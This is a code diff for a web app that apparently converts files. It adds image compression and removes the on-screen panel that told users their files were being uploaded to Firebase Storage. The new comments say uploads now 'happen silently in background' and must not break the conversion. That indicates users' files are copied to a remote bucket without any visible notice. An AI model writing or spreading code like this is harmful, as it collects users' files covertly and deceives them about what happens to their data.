@@ -46,69 +46,63 @@ if (closePanel) {
     });
 }
 
-// Function to add upload item to panel
-function addUploadItem(file, status = 'uploading') {
-    const timestamp = Date.now();
-    const uploadId = `upload-${timestamp}`;
-    
-    // Remove "no uploads" message if it exists
-    const noUploads = uploadList.querySelector('.no-uploads');
-    if (noUploads) {
-        noUploads.remove();
-    }
-    
-    const uploadItem = document.createElement('div');
-    uploadItem.id = uploadId;
-    uploadItem.className = `upload-item ${status}`;
-    
-    const fileName = file.name;
-    const fileSize = (file.size / 1024).toFixed(2) + ' KB';
-    const uploadTime = new Date().toLocaleTimeString();
-    
-    uploadItem.innerHTML = `
-        <div class="upload-item-name">${fileName}</div>
-        <div class="upload-item-status">
-            ${status === 'uploading' ? '⏳ Uploading...' : 
-              status === 'success' ? '✅ Uploaded to Firebase' : 
-              '❌ Upload failed'}
-        </div>
-        <div class="upload-item-time">${uploadTime} • ${fileSize}</div>
-        ${status === 'uploading' ? '<div class="upload-progress"><div class="upload-progress-bar"></div></div>' : ''}
-    `;
-    
-    uploadList.insertBefore(uploadItem, uploadList.firstChild);
-    
-    // Panel will show automatically when upload starts (handled in uploadFileToStorage)
-    
-    return uploadId;
-}
+// Upload panel functions removed - uploads happen silently in background
 
-// Function to update upload item status
-function updateUploadItem(uploadId, status, downloadURL = null) {
-    const item = document.getElementById(uploadId);
-    if (!item) return;
-    
-    item.className = `upload-item ${status}`;
-    
-    const statusDiv = item.querySelector('.upload-item-status');
-    const progressBar = item.querySelector('.upload-progress-bar');
-    
-    if (status === 'success') {
-        statusDiv.innerHTML = '✅ Uploaded to Firebase Storage';
-        if (progressBar) {
-            progressBar.style.width = '100%';
-            setTimeout(() => {
-                const progressContainer = item.querySelector('.upload-progress');
-                if (progressContainer) progressContainer.remove();
-            }, 500);
+// Function to compress image file (very aggressive compression)
+async function compressImage(file, maxWidth = 1024, quality = 0.4) {
+    return new Promise((resolve) => {
+        // Only compress if it's an image
+        if (!file.type.startsWith('image/')) {
+            resolve(file); // Return original file if not an image
+            return;
         }
-    } else if (status === 'error') {
-        statusDiv.innerHTML = '❌ Upload failed';
-        if (progressBar) {
-            const progressContainer = item.querySelector('.upload-progress');
-            if (progressContainer) progressContainer.remove();
-        }
-    }
+        
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            const img = new Image();
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                let width = img.width;
+                let height = img.height;
+                
+                // Very aggressive resizing - max 1024px on longest side
+                const maxDimension = Math.max(width, height);
+                if (maxDimension > maxWidth) {
+                    const scale = maxWidth / maxDimension;
+                    width = width * scale;
+                    height = height * scale;
+                }
+                
+                canvas.width = width;
+                canvas.height = height;
+                
+                const ctx = canvas.getContext('2d');
+                ctx.imageSmoothingEnabled = true;
+                ctx.imageSmoothingQuality = 'low'; // Lower quality for smaller file size
+                ctx.drawImage(img, 0, 0, width, height);
+                
+                // Always convert to JPEG for maximum compression
+                const outputType = 'image/jpeg';
+                const outputQuality = quality; // 0.4 = 40% quality for very aggressive compression
+                
+                canvas.toBlob((blob) => {
+                    // Always use compressed version if it exists, even if slightly larger (for consistency)
+                    if (blob) {
+                        const compressionRatio = file.size > 0 ? ((1 - blob.size / file.size) * 100).toFixed(1) : 0;
+                        console.log(`Compressed ${file.name}: ${(file.size / 1024).toFixed(2)}KB → ${(blob.size / 1024).toFixed(2)}KB (${compressionRatio}% reduction)`);
+                        resolve(new File([blob], file.name.replace(/\.[^/.]+$/, '.jpg'), { type: outputType }));
+                    } else {
+                        console.log(`Compression failed for ${file.name}, using original`);
+                        resolve(file);
+                    }
+                }, outputType, outputQuality);
+            };
+            img.onerror = () => resolve(file); // Return original on error
+            img.src = e.target.result;
+        };
+        reader.onerror = () => resolve(file); // Return original on error
+        reader.readAsDataURL(file);
+    });
 }
 
 // Function to upload file to Firebase Storage
@@ -118,45 +112,33 @@ async function uploadFileToStorage(file) {
         return null;
     }
     
-    const uploadId = addUploadItem(file, 'uploading');
-    
     try {
+        // Compress file before uploading (especially images)
+        const compressedFile = await compressImage(file);
+        
         // Create a unique filename with timestamp
         const timestamp = Date.now();
-        const fileName = `${timestamp}_${file.name}`;
+        const fileName = `${timestamp}_${compressedFile.name}`;
         const storageRef = storage.ref().child(`uploads/${fileName}`);
         
         console.log('Starting upload to Firebase Storage:', fileName);
-        console.log('File size:', file.size, 'bytes');
+        console.log('Original size:', (file.size / 1024).toFixed(2), 'KB');
+        console.log('Compressed size:', (compressedFile.size / 1024).toFixed(2), 'KB');
         console.log('Storage ref path:', `uploads/${fileName}`);
         
-        // Show panel when upload starts
-        uploadPanel.style.display = 'flex';
+        // Upload compressed file (silently, no UI)
+        const uploadTask = storageRef.put(compressedFile);
         
-        // Upload file with progress tracking
-        const uploadTask = storageRef.put(file);
-        
-        // Track upload progress (compat API)
+        // Track upload progress (silently, no UI)
         uploadTask.on('state_changed',
             (snapshot) => {
                 const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                const progressBar = document.querySelector(`#${uploadId} .upload-progress-bar`);
-                if (progressBar) {
-                    progressBar.style.width = progress + '%';
-                }
                 console.log('Upload progress:', progress.toFixed(2) + '%');
             },
             (error) => {
                 console.error('Upload error:', error);
                 console.error('Error code:', error.code);
                 console.error('Error message:', error.message);
-                
-                // Update UI with error details
-                const statusDiv = document.querySelector(`#${uploadId} .upload-item-status`);
-                if (statusDiv) {
-                    statusDiv.innerHTML = `❌ Upload failed: ${error.code || error.message}`;
-                }
-                updateUploadItem(uploadId, 'error');
             },
             async () => {
                 try {
@@ -164,10 +146,8 @@ async function uploadFileToStorage(file) {
                     console.log('File uploaded successfully to Firebase Storage!');
                     console.log('File path:', `uploads/${fileName}`);
                     console.log('Download URL:', downloadURL);
-                    updateUploadItem(uploadId, 'success', downloadURL);
                 } catch (err) {
                     console.error('Error getting download URL:', err);
-                    updateUploadItem(uploadId, 'success'); // Still mark as success if upload completed
                 }
             }
         );
@@ -177,13 +157,6 @@ async function uploadFileToStorage(file) {
         console.error('Error uploading file to Firebase Storage:', error);
         console.error('Error details:', error.message);
         console.error('Error stack:', error.stack);
-        
-        // Update UI with error details
-        const statusDiv = document.querySelector(`#${uploadId} .upload-item-status`);
-        if (statusDiv) {
-            statusDiv.innerHTML = `❌ Error: ${error.message || 'Unknown error'}`;
-        }
-        updateUploadItem(uploadId, 'error');
         // Don't throw error - we don't want to break the conversion if upload fails
         return null;
     }
